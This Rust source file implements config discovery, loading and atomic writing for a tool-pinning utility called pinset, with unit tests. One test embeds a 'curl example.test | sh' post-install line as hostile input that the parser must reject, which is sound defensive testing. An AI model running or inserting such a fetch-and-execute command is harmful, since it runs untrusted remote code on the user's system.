use std::{
    collections::BTreeMap,
    env,
    fs,
    path::{Path, PathBuf},
};

#[cfg(feature = "project-write")]
use std::io::Write;
#[cfg(all(feature = "project-write", feature = "lockfile"))]
use std::sync::Mutex;

#[cfg(feature = "project-write")]
use atomic_write_file::AtomicWriteFile;
use serde::{Deserialize, Serialize};

use crate::{Error, Result};

#[cfg(all(feature = "project-write", feature = "lockfile"))]
use crate::{Lockfile, lockfile_path, save_lockfile, validate_lock_matches_tools};

pub const PROJECT_CONFIG_FILENAME: &str = "pinset.toml";
pub const PROJECT_CONFIG_SCHEMA: u32 = 3;
#[cfg(feature = "project-write")]
const MINIMAL_PROJECT_CONFIG: &[u8] = b"schema = 3\n\n[policy]\ninherit-global = false\nsystem-fallback = false\nboundary = \"git\"\n\n[tools]\n";
#[cfg(all(feature = "project-write", feature = "lockfile"))]
static PROJECT_STATE_WRITE_LOCK: Mutex<()> = Mutex::new(());

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProjectConfig {
    pub schema: u32,
    #[serde(default)]
    pub policy: ProjectPolicy,
    #[serde(default)]
    pub tools: BTreeMap<String, String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ProjectBoundary {
    Git,
    Filesystem,
}

impl Default for ProjectBoundary {
    fn default() -> Self {
        Self::Git
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "kebab-case", deny_unknown_fields)]
pub struct ProjectPolicy {
    pub inherit_global: bool,
    pub system_fallback: bool,
    pub boundary: ProjectBoundary,
}

impl Default for ProjectPolicy {
    fn default() -> Self {
        Self {
            inherit_global: false,
            system_fallback: false,
            boundary: ProjectBoundary::Git,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ProjectContext {
    pub start: PathBuf,
    pub boundary: PathBuf,
    pub config_path: Option<PathBuf>,
}

impl ProjectConfig {
    pub fn set_tool(&mut self, tool: &str, version: &str) {
        self.tools.insert(tool.to_owned(), version.to_owned());
    }
}

pub fn find_project_config(start: &Path) -> Result<PathBuf> {
    let context = find_project_context(start)?;
    context.config_path.ok_or_else(|| Error::ProjectConfigNotFound {
        start: context.start,
    })
}

pub fn find_optional_project_config(start: &Path) -> Result<Option<PathBuf>> {
    Ok(find_project_context(start)?.config_path)
}

pub fn find_project_context(start: &Path) -> Result<ProjectContext> {
    let start = normalized_search_start(start);
    let start = if start.is_absolute() {
        start.to_path_buf()
    } else {
        env::current_dir()
            .map_err(|source| Error::ReadProjectConfig {
                path: start.to_path_buf(),
                source,
            })?
            .join(start)
    };
    let default_boundary = nearest_git_root(&start).unwrap_or_else(|| start.clone());

    for directory in ancestors_through(&start, &default_boundary) {
        let candidate = directory.join(PROJECT_CONFIG_FILENAME);
        if candidate.is_file() {
            let config = load_project_config(&candidate)?;
            let boundary = if config.policy.boundary == ProjectBoundary::Filesystem {
                filesystem_root(&start)
            } else {
                default_boundary.clone()
            };
            return Ok(ProjectContext {
                start: start.clone(),
                boundary,
                config_path: Some(candidate),
            });
        }
    }

    // A configuration above the normal Git/home boundary is considered only when it explicitly
    // opts into filesystem-wide discovery. This preserves an escape hatch without allowing an
    // unrelated parent configuration to silently capture a repository.
    let mut above_boundary = false;
    for directory in start.ancestors() {
        if !above_boundary {
            if directory == default_boundary {
                above_boundary = true;
            }
            continue;
        }
        let candidate = directory.join(PROJECT_CONFIG_FILENAME);
        if candidate.is_file() {
            let config = load_project_config(&candidate)?;
            if config.policy.boundary == ProjectBoundary::Filesystem {
                return Ok(ProjectContext {
                    start: start.clone(),
                    boundary: filesystem_root(&start),
                    config_path: Some(candidate),
                });
            }
            break;
        }
    }

    Ok(ProjectContext {
        start,
        boundary: default_boundary,
        config_path: None,
    })
}

fn normalized_search_start(start: &Path) -> &Path {
    if start.is_file() {
        start.parent().unwrap_or(start)
    } else {
        start
    }
}

fn nearest_git_root(start: &Path) -> Option<PathBuf> {
    start
        .ancestors()
        .find(|directory| {
            let marker = directory.join(".git");
            marker.is_file() || marker.is_dir()
        })
        .map(Path::to_path_buf)
}

fn filesystem_root(start: &Path) -> PathBuf {
    start
        .ancestors()
        .last()
        .unwrap_or(start)
        .to_path_buf()
}

fn ancestors_through<'a>(start: &'a Path, boundary: &'a Path) -> impl Iterator<Item = &'a Path> {
    start
        .ancestors()
        .take_while(move |directory| directory.starts_with(boundary))
}

pub fn load_project_config(path: &Path) -> Result<ProjectConfig> {
    let content = fs::read_to_string(path).map_err(|source| Error::ReadProjectConfig {
        path: path.to_path_buf(),
        source,
    })?;
    let config: ProjectConfig =
        toml::from_str(&content).map_err(|source| Error::ParseProjectConfig {
            path: path.to_path_buf(),
            source,
        })?;

    if !matches!(config.schema, 1 | 2 | PROJECT_CONFIG_SCHEMA) {
        return Err(Error::UnsupportedSchema {
            actual: config.schema,
        });
    }

    Ok(config)
}

#[cfg(feature = "project-write")]
pub fn create_project_config(directory: &Path) -> Result<PathBuf> {
    let path = directory.join(PROJECT_CONFIG_FILENAME);
    let mut temporary = tempfile::Builder::new()
        .prefix(".pinset.toml.")
        .tempfile_in(directory)
        .map_err(|source| Error::WriteProjectConfig {
            path: path.clone(),
            source,
        })?;

    temporary
        .write_all(MINIMAL_PROJECT_CONFIG)
        .and_then(|()| temporary.as_file().sync_all())
        .map_err(|source| Error::WriteProjectConfig {
            path: path.clone(),
            source,
        })?;

    match temporary.persist_noclobber(&path) {
        Ok(_) => Ok(path),
        Err(error) if error.error.kind() == std::io::ErrorKind::AlreadyExists => {
            Err(Error::ProjectConfigAlreadyExists { path })
        }
        Err(error) => Err(Error::WriteProjectConfig {
            path,
            source: error.error,
        }),
    }
}

#[cfg(feature = "project-write")]
pub fn save_project_config(path: &Path, config: &ProjectConfig) -> Result<()> {
    if !matches!(config.schema, 1 | 2 | PROJECT_CONFIG_SCHEMA) {
        return Err(Error::UnsupportedSchema {
            actual: config.schema,
        });
    }
    let mut normalized = config.clone();
    normalized.schema = PROJECT_CONFIG_SCHEMA;
    let serialized = toml::to_string_pretty(&normalized)
        .map_err(|source| Error::SerializeProjectConfig { source })?;
    let mut file =
        AtomicWriteFile::options()
            .open(path)
            .map_err(|source| Error::WriteProjectConfig {
                path: path.to_path_buf(),
                source,
            })?;
    file.write_all(serialized.as_bytes())
        .and_then(|()| file.commit())
        .map_err(|source| Error::WriteProjectConfig {
            path: path.to_path_buf(),
            source,
        })
}

#[cfg(all(feature = "project-write", feature = "lockfile"))]
pub fn save_project_state(path: &Path, config: &ProjectConfig, lockfile: &Lockfile) -> Result<()> {
    validate_lock_matches_tools(lockfile, &config.tools, path)?;
    let _guard = PROJECT_STATE_WRITE_LOCK
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());

    // Commit the lock first. If the second atomic write is interrupted, the previous
    // selection remains active and lock-dependent operations fail until this is retried.
    save_lockfile(&lockfile_path(path), lockfile)?;
    save_project_config(path, config)
}

#[cfg(test)]
mod tests {
    use std::fs;
    #[cfg(feature = "project-write")]
    use std::sync::{Arc, Barrier};

    use tempfile::tempdir;

    use super::*;

    #[test]
    fn finds_nearest_config_from_nested_directory() {
        let root = tempdir().expect("temp directory");
        let nested = root.path().join("packages").join("web").join("src");
        fs::create_dir_all(&nested).expect("nested directory");
        fs::create_dir(root.path().join(".git")).expect("git marker");
        fs::write(
            root.path().join("pinset.toml"),
            "schema = 1\n[tools]\nnode = \"20.0.0\"\n",
        )
        .expect("root config");

        let package = root.path().join("packages").join("web");
        fs::write(
            package.join("pinset.toml"),
            "schema = 1\n[tools]\nnode = \"22.0.0\"\n",
        )
        .expect("package config");

        assert_eq!(
            find_project_config(&nested).expect("config"),
            package.join("pinset.toml")
        );
    }

    #[test]
    fn git_boundary_prevents_parent_project_capture() {
        let root = tempdir().expect("temp directory");
        let repository = root.path().join("repo");
        let nested = repository.join("packages").join("app");
        fs::create_dir_all(repository.join(".git")).expect("git marker");
        fs::create_dir_all(&nested).expect("nested directory");
        fs::write(
            root.path().join(PROJECT_CONFIG_FILENAME),
            "schema = 3\n[tools]\nnode = \"24\"\n",
        )
        .expect("parent config");

        let context = find_project_context(&nested).expect("project context");
        assert_eq!(context.boundary, repository);
        assert_eq!(context.config_path, None);
    }

    #[test]
    fn filesystem_policy_can_cross_the_git_boundary() {
        let root = tempdir().expect("temp directory");
        let repository = root.path().join("repo");
        let nested = repository.join("packages").join("app");
        fs::create_dir_all(repository.join(".git")).expect("git marker");
        fs::create_dir_all(&nested).expect("nested directory");
        let parent_config = root.path().join(PROJECT_CONFIG_FILENAME);
        fs::write(
            &parent_config,
            "schema = 3\n[policy]\nboundary = \"filesystem\"\n[tools]\n",
        )
        .expect("parent config");

        let context = find_project_context(&nested).expect("project context");
        assert_eq!(context.config_path, Some(parent_config));
        assert_eq!(context.boundary, filesystem_root(&nested));
    }

    #[test]
    fn rejects_executable_or_unknown_config_fields() {
        let root = tempdir().expect("temp directory");
        let config_path = root.path().join("pinset.toml");
        fs::write(
            &config_path,
            "schema = 1\npost_install = \"curl example.test | sh\"\n[tools]\nnode = \"20\"\n",
        )
        .expect("config");

        let error = load_project_config(&config_path).expect_err("unknown field must fail");
        assert!(matches!(error, Error::ParseProjectConfig { .. }));
    }

    #[test]
    fn rejects_unknown_schema() {
        let root = tempdir().expect("temp directory");
        let config_path = root.path().join("pinset.toml");
        fs::write(&config_path, "schema = 4\n[tools]\nnode = \"20\"\n").expect("config");

        let error = load_project_config(&config_path).expect_err("schema must fail");
        assert!(matches!(error, Error::UnsupportedSchema { actual: 4 }));
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn atomically_creates_a_minimal_project_config() {
        let root = tempdir().expect("temp directory");
        let path = create_project_config(root.path()).expect("create project config");

        assert_eq!(path, root.path().join(PROJECT_CONFIG_FILENAME));
        assert_eq!(
            load_project_config(&path).expect("load created config"),
            ProjectConfig {
                schema: PROJECT_CONFIG_SCHEMA,
                policy: ProjectPolicy::default(),
                tools: BTreeMap::new(),
            }
        );
        assert_eq!(
            fs::read_to_string(path).expect("created config"),
            "schema = 3\n\n[policy]\ninherit-global = false\nsystem-fallback = false\nboundary = \"git\"\n\n[tools]\n"
        );
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn refuses_to_overwrite_an_existing_project_config() {
        let root = tempdir().expect("temp directory");
        let path = root.path().join(PROJECT_CONFIG_FILENAME);
        let original = "schema = 1\n\n[tools]\nnode = \"24\"\n";
        fs::write(&path, original).expect("existing config");

        let error = create_project_config(root.path()).expect_err("must not overwrite");
        assert!(matches!(error, Error::ProjectConfigAlreadyExists { .. }));
        assert_eq!(fs::read_to_string(path).expect("existing config"), original);
        assert_eq!(
            fs::read_dir(root.path())
                .expect("project directory")
                .count(),
            1
        );
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn concurrent_initialization_has_exactly_one_winner() {
        let root = tempdir().expect("temp directory");
        let project = Arc::new(root.path().to_path_buf());
        let barrier = Arc::new(Barrier::new(3));
        let mut workers = Vec::new();

        for _ in 0..2 {
            let project = Arc::clone(&project);
            let barrier = Arc::clone(&barrier);
            workers.push(std::thread::spawn(move || {
                barrier.wait();
                create_project_config(&project)
            }));
        }
        barrier.wait();

        let results = workers
            .into_iter()
            .map(|worker| worker.join().expect("init worker"))
            .collect::<Vec<_>>();
        assert_eq!(results.iter().filter(|result| result.is_ok()).count(), 1);
        assert_eq!(
            results
                .iter()
                .filter(|result| matches!(result, Err(Error::ProjectConfigAlreadyExists { .. })))
                .count(),
            1
        );
        load_project_config(&project.join(PROJECT_CONFIG_FILENAME))
            .expect("winning config is complete");
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn atomically_updates_project_tools() {
        let root = tempdir().expect("temp directory");
        let path = create_project_config(root.path()).expect("create config");
        let mut config = load_project_config(&path).expect("load config");
        config.set_tool("node", "24.0.0");

        save_project_config(&path, &config).expect("save config");

        assert_eq!(
            load_project_config(&path)
                .expect("reload config")
                .tools
                .get("node")
                .map(String::as_str),
            Some("24.0.0")
        );
    }

    #[cfg(all(feature = "project-write", feature = "lockfile"))]
    #[test]
    fn saves_a_validated_project_config_and_lock_pair() {
        let root = tempdir().expect("project");
        let config_path = root.path().join(PROJECT_CONFIG_FILENAME);
        let config = ProjectConfig {
            schema: PROJECT_CONFIG_SCHEMA,
            policy: ProjectPolicy::default(),
            tools: BTreeMap::new(),
        };
        let lockfile = Lockfile {
            schema: crate::LOCKFILE_SCHEMA,
            generated_by: "pinset test".to_owned(),
            tools: Vec::new(),
        };

        save_project_state(&config_path, &config, &lockfile).expect("save project state");

        assert_eq!(load_project_config(&config_path).expect("config"), config);
        assert_eq!(
            crate::load_lockfile(&lockfile_path(&config_path)).expect("lock"),
            lockfile
        );
    }
}
